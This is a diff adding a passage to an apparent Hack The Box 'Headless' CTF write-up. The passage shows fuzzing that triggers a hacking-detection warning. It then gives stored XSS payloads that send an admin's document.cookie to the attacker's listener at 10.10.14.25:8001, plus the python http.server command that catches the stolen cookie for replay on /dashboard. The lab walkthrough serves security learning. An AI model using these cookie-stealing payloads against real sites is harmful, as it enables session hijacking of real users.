@@ -239,9 +239,33 @@ We're ready to click on "Start attack". The attacks tries every payload above in
 ![intruder]({{https://jsom1.github.io/}}/_images/htb_headless_intruder.png){: height="420px" width = "400px"}
 </div>
 
-As we see in the image above, the length changes between payloads 147 and 165. Those payloads are the ones testing for an XSS vulnerability (147-156) as well as an SSTI vulnerability (157-164). They triggered the message "*Hacking Attempt Detected. Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation*". Well, sending 170 requests was not that discrete...
+As we see in the image above, the length changes between payloads 147 and 165. Those payloads are the ones testing for an XSS vulnerability (147-156) as well as an SSTI vulnerability (157-164). They triggered the message "*Hacking Attempt Detected. Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation*". Well, sending 170 requests was not that discrete...\\
+After trying different payloads and encoding, I had to look at the forum for a hint. Apparently, we should be able to steal the admin cookie by exploiting an XSS vulnerability. The idea is to submit a message containing a payload which, once seen by an admin, retrieves their cookie and send it back to us. A payload we can try is the following (my IP is *10.10.14.25*):
 
+```
+<script>document.location=’http://10.10.14.25:8001/?cookie=’+document.cookie</script> --> didn't work
+<script>var i=new Image(); i.src="http://10.10.14.25:8001/?cookie="+btoa(document.cookie);</script> --> worked
+```
 
+The command that worked comes from <a href="https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e" target="_blank">this article</a>:
+
+<div class="img_container">
+![intruder]({{https://jsom1.github.io/}}/_images/htb_headless_payload.png){: height="250px" width = "400px"}
+</div>
+
+Note that before sending the request, we must start a web server on Kali:
+
+```
+sudo python3 -m http.server 8001
+```
+
+Then, we send the request. It takes some time to get something on our server:
+
+<div class="img_container">
+![admin cookie]({{https://jsom1.github.io/}}/_images/htb_headless_admincookie.png){: height="50px" width = "400px"}
+</div>
+
+And we have an admin cookie. We can take this cookie, go on the */dashboard* page again, and replace our user cookie:
 
 
 
